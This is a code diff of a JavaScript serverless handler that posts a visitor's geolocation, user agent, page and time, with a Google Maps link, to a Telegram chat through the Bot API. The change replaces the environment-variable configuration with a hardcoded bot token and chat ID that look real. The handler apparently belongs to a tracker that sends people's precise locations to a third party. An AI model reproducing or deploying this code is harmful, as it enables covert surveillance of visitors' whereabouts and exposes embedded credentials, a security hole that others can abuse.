@@ -5,11 +5,8 @@ export default async function handler(req, res) {
   }
 
   try {
-    if (!process.env.BOT_TOKEN || !process.env.CHAT_ID) {
-      console.error("Missing BOT_TOKEN or CHAT_ID in environment variables.");
-      res.status(500).json({ ok: false, error: "BOT_TOKEN yoki CHAT_ID sozlanmagan." });
-      return;
-    }
+    const BOT_TOKEN = "8938947614:AAEgbgugugi6XenUmZfQWwEE_LHgyzXEQZM";
+    const CHAT_ID = "5399168630";
 
     const { latitude, longitude, accuracy, page, userAgent, time } = req.body;
 
@@ -29,11 +26,11 @@ https://maps.google.com/?q=${latitude},${longitude}
 `;
 
     const telegramResponse = await fetch(
-      `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
+      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
       {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: process.env.CHAT_ID, text })
+        body: JSON.stringify({ chat_id: CHAT_ID, text })
       }
     );
 
